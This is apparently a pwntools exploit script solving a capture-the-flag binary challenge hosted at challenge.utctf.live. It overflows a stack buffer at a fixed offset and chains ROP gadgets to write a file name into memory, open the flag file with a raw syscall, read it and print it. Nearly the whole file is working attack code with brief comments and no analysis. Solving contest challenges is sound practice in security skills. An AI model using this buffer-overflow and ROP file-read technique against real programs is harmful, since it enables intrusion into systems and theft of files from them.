#!/usr/bin/env python3

from pwn import *

e = ELF("chal")

context.binary = e

def conn(cond):
    if cond == 1:
        r = process([e.path])
    elif cond == 2:
        r = gdb.debug([e.path], gdbscript="""
            b *main+114
            b *main+145
            b *0x44f980
            c
            c
            """)
    elif cond == 3:
        r = remote("challenge.utctf.live", 5141)
        #r = remote("localhost", 9000)

    return r


def main():
    r = conn(3)

    offsetRip = 0x88

    rop = ROP(e)               # Create a ROP object

    # Locate syscall PLT addresses
    open_plt = e.sym['open64']
    read_plt = e.sym['read']
    write_plt = e.sym['write']

    # Writable memory location (for buffer)
    bss_section = e.bss() + 0x100

    # Pop gadgets (found earlier)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
    pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
    # 0x0000000000433a83 : mov qword ptr [rdi], rdx ; ret
    mov_qword_rdi_rdx = 0x0000000000433a83
    syscallRet = 0x000000000041ae16
    #0x000000000048630b : pop rdx ; pop rbx ; ret
    pop_rdx_rbx = 0x000000000048630b

    print(f"pop_rdi: {hex(pop_rdi)}")
    print(f"pop_rsi: {hex(pop_rsi)}")
    print(f"pop_rdx_rbx: {hex(pop_rdx_rbx)}")

    # ROP chain

    rop.raw(pop_rdi)  # File name
    rop.raw(p64(bss_section))
    rop.raw(pop_rdx_rbx)
    rop.raw(b"./flag.t")  # rdx = "./flag.t"
    rop.raw(p64(0))  # Dummy rbx
    rop.raw(p64(mov_qword_rdi_rdx))  # mov [rdi], rdx

    rop.raw(p64(pop_rdi))  # Set destination (bss_section + 8)
    rop.raw(p64(bss_section + 8))
    rop.raw(p64(pop_rdx_rbx))  # Set value ("xt\x00")
    rop.raw(b"xt\x00\x00\x00\x00\x00\x00")  # rdx = "xt\x00"
    rop.raw(p64(0))  # Dummy rbx
    rop.raw(p64(mov_qword_rdi_rdx))  # mov [rdi], rdx




    # 1 Open("flag.txt", O_RDONLY)
    rop.raw(pop_rdi)  # File name
    rop.raw(p64(bss_section))
    rop.raw(pop_rsi)  # O_RDONLY = 0
    rop.raw(p64(0))
    # rop.raw(open_plt)  # Call open()
    rop.raw(pop_rax)
    rop.raw(p64(2))
    rop.raw(syscallRet)

    # 2 Read(fd, buffer, 64)
    rop.raw(pop_rdi)  # File descriptor (assuming open() returns 5)
    rop.raw(p64(5))   # This is hardcoded be carefull!!!! Maybe you will need to change it's value
    #I was too lazy to get another gadget
    rop.raw(pop_rsi)  # Buffer to store flag
    rop.raw(p64(bss_section))
    rop.raw(pop_rdx_rbx)  # Read 64 bytes
    rop.raw(p64(64))
    rop.raw(p64(0))
    rop.raw(read_plt)  # Call read()

    # 3 Write(1, buffer, 64)
    rop.raw(pop_rdi)  # STDOUT file descriptor
    rop.raw(p64(1))
    rop.raw(pop_rsi)  # Buffer containing flag
    rop.raw(p64(bss_section))
    rop.raw(write_plt)  # Call write()
    rop.raw(e.sym['main'] + 77)  # Return to main



    # print(rop.dump())

    # Send payload
    r.sendline(fit({offsetRip: rop.chain()}))  # Overflow + ROP chain

    r.interactive()

if __name__ == "__main__":
    main()